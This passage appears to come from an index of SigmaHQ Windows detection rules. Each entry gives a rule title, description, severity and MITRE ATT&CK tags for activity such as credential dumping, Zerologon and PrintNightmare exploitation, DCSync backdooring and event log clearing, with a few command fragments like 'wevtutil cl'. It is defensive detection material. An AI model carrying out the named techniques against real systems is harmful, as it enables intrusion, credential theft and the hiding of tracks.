* https://securelist.com/operation-tunnelsnake-and-moriya-rootkit/101831

    
### Turla PNG Dropper Service
    
    This method detects malicious services mentioned in Turla PNG dropper report by NCC Group in November 2018

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.g0010
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_apt_turla_service_png.yml
* https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/november/turla-png-dropper-is-back/

    
### Credential Dumping Tools Service Execution
    
    Detects well-known credential dumping tools execution via service execution events

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.execution
    * MITRE: attack.t1003.001
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.004
    * MITRE: attack.t1003.005
    * MITRE: attack.t1003.006
    * MITRE: attack.t1569.002
    * MITRE: attack.s0005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_mal_creddumper.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### Invoke-Obfuscation CLIP+ Launcher
    
    Detects Obfuscated use of Clip.exe to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_invoke_obfuscation_clip_services.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### ProcessHacker Privilege Elevation
    
    Detects a ProcessHacker tool that elevated privileges to a very high level

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1543.003
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_susp_proceshacker.yml
* https://twitter.com/1kwpeter/status/1397816101455765504

    
### Sysmon Crash
    
    Detectes application popup reporting a failure of the Sysmon service

    * Level: high
    * MITRE: attack.t1562
    * MITRE: attack.impair_defenses
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_system_application_sysmon_crash.yml
    
### Zerologon Exploitation Using Well-known Tools
    
    This rule is designed to detect attempts to exploit Zerologon (CVE-2020-1472) vulnerability using mimikatz zerologon module or other exploits from machine with "kali" hostname.

    * Level: critical
    * MITRE: attack.t1210
    * MITRE: attack.lateral_movement
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_possible_zerologon_exploitation_using_wellknown_tools.yml
* https://www.secura.com/blog/zero-logon

* https://bi-zone.medium.com/hunting-for-zerologon-f65c61586382

    
### Eventlog Cleared
    
    One of the Windows Eventlogs has been cleared. e.g. caused by "wevtutil cl" command execution

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.001
    * MITRE: car.2016-04-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_eventlog_cleared.yml
* https://twitter.com/deviouspolack/status/832535435960209408

* https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100

    
### NTLMv1 Logon Between Client and Server
    
    Detects the reporting of NTLMv1 being used between a client and server

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.t1550.002
    * MITRE: attack.s0363
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_lsasrv_ntlmv1.yml
* https://attack.mitre.org/techniques/T1550/002/

    
### PowerShell Scripts Installed as Services
    
    Detects powershell script installed as a Service

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_powershell_script_installed_as_service.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse

    
### QuarksPwDump Clearing Access History
    
    Detects QuarksPwDump clearing access history in hive

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_quarkspwdump_clearing_hive_access_history.yml
    
### Invoke-Obfuscation Via Stdin
    
    Detects Obfuscated Powershell via Stdin in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_invoke_obfuscation_via_stdin_services.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Invoke-Obfuscation STDIN+ Launcher
    
    Detects Obfuscated use of stdin to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_invoke_obfuscation_stdin_services.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious Service Installation
    
    Detects suspicious service installation commands

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: car.2013-09-005
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_susp_service_installation.yml
    
### Windows Defender Threat Detection Disabled - Service
    
    Detects disabling Windows Defender threat protection

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_system_defender_disabled.yml
* https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-test/troubleshoot-windows-defender-test

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

    
### NTFS Vulnerability Exploitation
    
    This the exploitation of a NTFS vulnerability as reported without many details via Twitter

    * Level: critical
    * MITRE: attack.impact
    * MITRE: attack.t1499.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_ntfs_vuln_exploit.yml
* https://twitter.com/jonasLyk/status/1347900440000811010

* https://twitter.com/wdormann/status/1347958161609809921

* https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/

    
### PsExec Tool Execution
    
    Detects PsExec service installation and execution events (service and Sysmon)

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    * MITRE: attack.s0029
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_tool_psexec.yml
* https://www.jpcert.or.jp/english/pub/sr/ir_research.html

* https://jpcertcc.github.io/ToolAnalysisResultSheet

    
### Service Installation in Suspicious Folder
    
    Detects service installation in suspicious folder appdata

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: car.2013-09-005
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_susp_service_installation_folder.yml
    
### Invoke-Obfuscation Via Use MSHTA
    
    Detects Obfuscated Powershell via use MSHTA in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_invoke_obfuscation_via_use_mshta_services.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Hacktool Service Registration or Execution
    
    Detects PsExec service installation and execution events (service and Sysmon)

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    * MITRE: attack.s0029
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_service_hacktools.yml
* Internal Research

    
### DHCP Server Error Failed Loading the CallOut DLL
    
    This rule detects a DHCP server error in which a specified Callout DLL (in registry) could not be loaded

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_susp_dhcp_config_failed.yml
* https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html

* https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx

* https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx

    
### Service Installation with Suspicious Folder Pattern
    
    Detects service installation with suspicious folder patterns

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: car.2013-09-005
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/system/win_susp_service_installation_folder_pattern.yml
    
### CVE-2021-1675 Print Spooler Exploitation
    
    Detects driver load events print service operational log that are a sign of successful exploitation attempts against print spooler vulnerability CVE-2021-1675

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1569
    * MITRE: cve.2021.1675
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/printservice/win_exploit_cve_2021_1675_printspooler_operational.yml
* https://twitter.com/MalwareJake/status/1410421967463731200

    
### Possible CVE-2021-1675 Print Spooler Exploitation
    
    Detects events of driver load errors in print service logs that could be a sign of successful exploitation attempts of print spooler vulnerability CVE-2021-1675

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1569
    * MITRE: cve.2021.1675
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/printservice/win_exploit_cve_2021_1675_printspooler.yml
* https://github.com/hhlxf/PrintNightmare

* https://github.com/afwu/PrintNightmare

* https://twitter.com/fuzzyf10w/status/1410202370835898371

    
### File Was Not Allowed To Run
    
    Detect run not allowed files. Applocker is a very useful tool, especially on servers where unprivileged users have access. For example terminal servers. You need configure applocker and log collect to receive these events.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    * MITRE: attack.t1059.001
    * MITRE: attack.t1059.003
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.006
    * MITRE: attack.t1059.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/applocker/win_applocker_file_was_not_allowed_to_run.yml
* https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker

* https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/using-event-viewer-with-applocker

* https://nxlog.co/documentation/nxlog-user-guide/applocker.html

    
### Code Integrity Blocked Driver Load
    
    Detects driver load events that got blocked by Windows code integrity checks

    * Level: high
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/code_integrity/win_codeintegrity_failed_driver_load.yml
* https://twitter.com/SBousseaden/status/1483810148602814466

    
### GALLIUM Artefacts
    
    Detects artefacts associated with activity group GALLIUM - Microsoft Threat Intelligence Center indicators released in December 2019.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/dns_server/win_apt_gallium.yml
* https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/

* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn800669(v=ws.11)

    
### DNS Server Error Failed Loading the ServerLevelPluginDLL
    
    This rule detects a DNS server error in which a specified plugin DLL (in registry) could not be loaded

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/dns_server/win_susp_dns_config.yml
* https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83

* https://technet.microsoft.com/en-us/library/cc735829(v=ws.10).aspx

* https://twitter.com/gentilkiwi/status/861641945944391680

    
### LDAP Reconnaissance / Active Directory Enumeration
    
    Detects possible Active Directory enumeration via LDAP

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1069.002
    * MITRE: attack.t1087.002
    * MITRE: attack.t1482
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/ldap/win_ldap_recon.yml
* https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/hunting-for-reconnaissance-activities-using-ldap-search-filters/ba-p/824726

* https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

* https://github.com/BloodHoundAD/SharpHound3/blob/master/SharpHound3/LdapBuilder.cs

    
### Failed MSExchange Transport Agent Installation
    
    Detects a failed installation of a Exchange Transport Agent

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1505.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/msexchange/win_exchange_transportagent_failed.yml
* https://twitter.com/blueteamsec1/status/1401290874202382336?s=20

    
### Exchange Set OabVirtualDirectory ExternalUrl Property
    
    Rule to detect an adversary setting OabVirtualDirectory External URL property to a script in Exchange Management log

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/msexchange/win_set_oabvirtualdirectory_externalurl.yml
* https://twitter.com/OTR_Community/status/1371053369071132675

    
### MSExchange Transport Agent Installation
    
    Detects the Installation of a Exchange Transport Agent

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1505.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/msexchange/win_exchange_transportagent.yml
* https://twitter.com/blueteamsec1/status/1401290874202382336?s=20

    
### Certificate Request Export to Exchange Webserver
    
    Detects a write of an Exchange CSR to an untypical directory or with aspx name suffix which can be used to place a webshell

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/msexchange/win_exchange_proxyshell_certificate_generation.yml
* https://twitter.com/GossiTheDog/status/1429175908905127938

    
### ProxyLogon MSExchange OabVirtualDirectory
    
    Detects specific patterns found after a successful ProxyLogon exploitation in relation to a Commandlet invocation of Set-OabVirtualDirectory

    * Level: critical
    * MITRE: attack.t1587.001
    * MITRE: attack.resource_development
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/msexchange/win_exchange_proxylogon_oabvirtualdir.yml
* https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon-cve-2021-26855-26858-27065-26857-6e885c5f197c

    
### Possible Exploitation of Exchange RCE CVE-2021-42321
    
    Detects log entries that appear in exploitation attempts against MS Exchange RCE CVE-2021-42321

    * Level: critical
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1210
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/msexchange/win_exchange_cve_2021_42321.yml
* https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321

    
### Mailbox Export to Exchange Webserver
    
    Detects a successful export of an Exchange mailbox to untypical directory or with aspx name suffix which can be used to place a webshell or the needed role assignment for it

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/msexchange/win_exchange_proxyshell_mailbox_export.yml
* https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html

    
### Remove Exported Mailbox from Exchange Webserver
    
    Detects removal of an exported Exchange mailbox which could be to cover tracks from ProxyShell exploit

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/msexchange/win_exchange_proxyshell_remove_mailbox_export.yml
* https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/exchange_proxyshell_rce.rb#L430

    
### HybridConnectionManager Service Running
    
    Rule to detect the Hybrid Connection Manager service running on an endpoint.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1554
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/servicebus/win_hybridconnectionmgr_svc_running.yml
* https://twitter.com/Cyb3rWard0g/status/1381642789369286662

    
### Rare Scheduled Task Creations
    
    This rule detects rare scheduled task creations. Typically software gets installed on multiple systems and not only on a few. The aggregation and count function selects tasks with rare names.

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.s0111
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/taskscheduler/win_rare_schtask_creation.yml
    
### Failed to Load Policy in Windows Firewall with Advanced Security
    
    The Windows Firewall service failed to load Group Policy.

    * Level: low
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/firewall_as/win_firewall_as_failed.yml
* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)

    
### Setting Change in Windows Firewall with Advanced Security
    
    Setting have been change in Windows Firewall

    * Level: low
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/firewall_as/win_firewall_as_setting_change.yml
* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)

    
### Delete Rule in Windows Firewall with Advanced Security
    
    A rule has been deleted in the Windows Firewall exception list.

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/firewall_as/win_firewall_as_delete_rule.yml
* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)

    
### Added Rule in Windows Firewall with Advanced Security
    
    A rule has been modified in the Windows Firewall exception list

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/firewall_as/win_firewall_as_add_rule.yml
* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)

    
### Reset to Default Configuration Windows Firewall with Advanced Security
    
    Windows Firewall has been reset to its default configuration.

    * Level: low
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/firewall_as/win_firewall_as_reset.yml
* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)

    
### Modified Rule in Windows Firewall with Advanced Security
    
    A rule has been modified in the Windows Firewall exception list

    * Level: low
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/firewall_as/win_firewall_as_change_rule.yml
* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)

    
### Suspicious Task Added by Bitsadmin
    
    Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads.
Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001)


    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.persistence
    * MITRE: attack.t1197
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/bits_client/win_bits_client_susp_use_bitsadmin.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md

    
### Suspicious Download File Extension with Bits
    
    Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads.
Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001)


    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.persistence
    * MITRE: attack.t1197
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/bits_client/win_bits_client_susp_local_file.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md

    
### Suspicious Task Added by Powershell
    
    Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads.
Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001)


    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.persistence
    * MITRE: attack.t1197
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/bits_client/win_bits_client_susp_powershell_job.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md

    
### Reconnaissance Activity
    
    Detects activity as "net user administrator /domain" and "net group domain admins /domain"

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1087.002
    * MITRE: attack.t1069.002
    * MITRE: attack.s0039
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_net_recon_activity.yml
* https://findingbad.blogspot.de/2017/01/hunting-what-does-it-look-like.html

    
### DCERPC SMB Spoolss Named Pipe
    
    Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_dce_rpc_smb_spoolss_named_pipe.yml
* https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1

* https://dirkjanm.io/a-different-way-of-abusing-zerologon/

* https://twitter.com/_dirkjan/status/1309214379003588608

    
### Meterpreter or Cobalt Strike Getsystem Service Installation
    
    Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1134.001
    * MITRE: attack.t1134.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_security_meterpreter_or_cobaltstrike_getsystem_service_install.yml
* https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment

* https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

    
### VSSAudit Security Event Source Registration
    
    Detects the registration of the security event source VSSAudit. It would usually trigger when volume shadow copy operations happen.

    * Level: informational
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_vssaudit_secevent_source_registration.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy

    
### WCE wceaux.dll Access
    
    Detects wceaux.dll access while WCE pass-the-hash remote command execution on source host

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003
    * MITRE: attack.s0005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_mal_wceaux_dll.yml
* https://www.jpcert.or.jp/english/pub/sr/ir_research.html

* https://jpcertcc.github.io/ToolAnalysisResultSheet

    
### Enabled User Right in AD to Control User Objects
    
    Detects scenario where if a user is assigned the SeEnableDelegationPrivilege right in Active Directory it would allow control of other AD user objects.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_alert_active_directory_user_control.yml
* https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/

    
### Powerview Add-DomainObjectAcl DCSync AD Extend Right
    
    backdooring domain object to grant the rights associated with DCSync to a regular user or machine account using Powerview\Add-DomainObjectAcl DCSync Extended Right cmdlet, will allow to re-obtain the pwd hashes of any user/computer

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_account_backdoor_dcsync_rights.yml
* https://twitter.com/menasec1/status/1111556090137903104

* https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf

    
### Malicious Service Installations
    
    Detects known malicious service installs that only appear in cases of lateral movement, credential dumping, and other suspicious activities.

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1003
    * MITRE: car.2013-09-005
    * MITRE: attack.t1543.003
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_security_mal_service_installs.yml
* https://awakesecurity.com/blog/threat-hunting-for-paexec/

* https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html

* https://blog.f-secure.com/wp-content/uploads/2019/10/CosmicDuke.pdf

    
### DPAPI Domain Backup Key Extraction
    
    Detects tools extracting LSA secret DPAPI domain backup key from Domain Controllers

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_dpapi_domain_backupkey_extraction.yml
* https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html

    
### ISO Image Mount
    
    Detects the mount of ISO images on an endpoint

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1566.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_iso_mount.yml
* https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore

* https://www.proofpoint.com/us/blog/threat-insight/threat-actor-profile-ta2719-uses-colorful-lures-deliver-rats-local-languages

* https://twitter.com/MsftSecIntel/status/1257324139515269121

    
### KrbRelayUp Attack Pattern
    
    Detects logon events that have characteristics of events generated during an attack with KrbRelayUp and the like

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.credential_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_krbrelayup.yml
* https://twitter.com/sbousseaden/status/1518976397364056071?s=12&t=qKO5eKHvWhAP19a50FTZ7g

* https://github.com/elastic/detection-rules/blob/fb6ee2c69864ffdfe347bf3b050cb931f53067a6/rules/windows/privilege_escalation_krbrelayup_suspicious_logon.toml

    
### Persistence and Execution at Scale via GPO Scheduled Task
    
    Detect lateral movement using GPO scheduled task, usually used to deploy ransomware at scale

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_gpo_scheduledtasks.yml
* https://twitter.com/menasec1/status/1106899890377052160

* https://www.secureworks.com/blog/ransomware-as-a-distraction

    
### SAM Registry Hive Handle Request
    
    Detects handles requested to SAM registry hive

    * Level: critical
    * MITRE: attack.discovery
    * MITRE: attack.t1012
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_sam_registry_hive_handle_request.yml
* https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190725024610.html

    
### Correct Execution of Nltest.exe
    
    The attacker might use LOLBAS nltest.exe for discovery of domain controllers, domain trusts, parent domain and the current user permissions.

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1482
    * MITRE: attack.t1018
    * MITRE: attack.t1016
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_lolbas_execution_of_nltest.yml
* https://jpcertcc.github.io/ToolAnalysisResultSheet/details/nltest.htm

* https://attack.mitre.org/software/S0359/

    
### T1047 Wmiprvse Wbemcomn DLL Hijack
    
    Detects a threat actor creating a file named `wbemcomn.dll` in the `C:\Windows\System32\wbem\` directory over the network for a WMI DLL Hijack scenario.

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1047
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_wmiprvse_wbemcomn_dll_hijack.yml
* https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009173318.html

    
### PowerShell Scripts Installed as Services
    
    Detects powershell script installed as a Service

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_security_powershell_script_installed_as_service.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse

    
### Invoke-Obfuscation VAR+ Launcher
    
    Detects Obfuscated use of Environment Variables to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_invoke_obfuscation_var_services_security.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### AD Object WriteDAC Access
    
    Detects WRITE_DAC access to a domain object

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1222.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_ad_object_writedac_access.yml
* https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190101151110.html

    
### Failed Logins with Different Accounts from Single Source System
    
    Detects suspicious failed logins with different user accounts from a single source system

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_logons_single_source2.yml
    
### Interactive Logon to Server Systems
    
    Detects interactive console logons to Server Systems

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_interactive_logons.yml
    
### Security Event Log Cleared
    
    Checks for event id 1102 which indicates the security event log was cleared.

    * Level: medium
    * MITRE: attack.t1070.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_event_log_cleared.yml
